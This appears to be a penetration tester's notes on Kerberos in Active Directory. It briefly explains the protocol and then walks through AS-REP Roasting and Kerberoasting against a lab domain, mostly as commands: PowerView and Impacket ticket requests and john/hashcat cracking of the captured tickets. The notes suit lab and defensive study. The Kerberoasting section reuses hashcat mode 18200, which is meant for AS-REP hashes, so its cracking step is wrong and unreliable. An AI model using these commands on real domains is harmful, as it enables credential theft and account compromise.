## KERBERUS

- Kerberos is an authentication protocol designed to allow two entities to establish a shared secret key securely over an insecure communication channel.

Key Distribution Center (KDC) - The KDC is the central authority that manages authentication and ticket issuance. It consists of two main services:

* Authentication Server (AS): Handles initial authentication and issues a Ticket Granting Ticket (TGT) to users upon successful verification.
* Ticket Granting Server (TGS): Issues Service Tickets (ST) to users who present a valid TGT, allowing access to specific resources.

The TGT is issued by the AS after successful authentication and allows users to request Service Tickets. The TGT is encrypted with the KDC’s secret key and contains:
* User ID
* TGS ID
* Expiration Time
* Ticket Flags (eg. pre_authent that specify that's the first ticket)

The Service Ticket (TGS Ticket) is granted by the TGS in exchange for a valid TGT. It allows users to access a specific service without entering credentials again. The ST is encrypted with the service’s secret key, ensuring secure access.


Kerberos attack - In an Active Directory (AD) environment, "roasting attacks" exploit weaknesses in the Kerberos authentication protocol, allowing attackers to capture tickets encrypted with passwords of users or service accounts.

* AS-REP Roasting – Targeting user accounts that do not require Kerberos preauthentication. (deep dive here)
* Kerberoasting – Exploiting service accounts with registered Service Principal Names (SPNs). (deep dive here)


## AS-REP Roasting

AS-REP Roasting exploits accounts for which Kerberos preauthentication is disabled. In a typical Kerberos authentication process, the client must send a timestamp encrypted with its password-derived key. 
This serves as proof that the authentication request is not being replayed. However, if preauthentication is disabled, the client does not need to send this encrypted timestamp. 
As a result, an attacker can request a Ticket Granting Ticket (TGT) for the target user and receive an AS-REP message encrypted with the user’s password hash

via PowerShell and check if the target accounts that have Kerberos pre-authentication disabled:

#PowerView
* Get-DomainUser -PreauthNotRequired -Verbose

Perform AS-REP Roasting using Impacket

* GetNPUsers.py dev-angelist.lab/asrep -dc-ip corp-dc -no-pass | grep '\$krb5asrep\$' > as-rep.txt

Crack the Ticket

* john --wordlist=/home/kali/Documents/password.txt ./as-rep.txt
* hashcat -m 18200 ./as-rep.txt /home/kali/Documents/password.txt
* john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worstpass.txt C:\AD\Tools\asrephashes.txt


## Kerberoasting

Kerberoasting targets service accounts with an assigned SPN. When a user requests access to a service, they receive a Service Ticket (ST) encrypted with the service account’s long-term password.

If an attacker can obtain the ST, they can attempt to crack the encryption offline to retrieve the service account password.

Verify the SPN
* Get-ADUser -Identity "kerberoasting" -Properties ServicePrincipalNames
* setspn -L kerberoasting

IMPACKET
* GetUserSPNs.py dev-angelist.lab/devan:'Password123!' -dc-ip corp-dc

Request Service Tickets for Kerberoasting

* GetUserSPNs.py dev-angelist.lab/devan:'Password123!' -dc-ip corp-dc -request #without specifing a user it checks all possible tickets
* GetUserSPNs.py dev-angelist.lab/devan:'Password123!' -dc-ip corp-dc -request-user kerberoasting | grep '\$krb5tgs\$' > kerberoast.txt

Crack the Service Ticket

* john --wordlist=/home/kali/Documents/password.txt ./kerberoast.txt
* hashcat -m 18200 ./kerberoast.txt /home/kali/Documents/password.txt
* #john.exe --wordlist=C:\AD\Tools\kerberoast\10kworst-pass.txt C:\AD\Tools\hashes.txt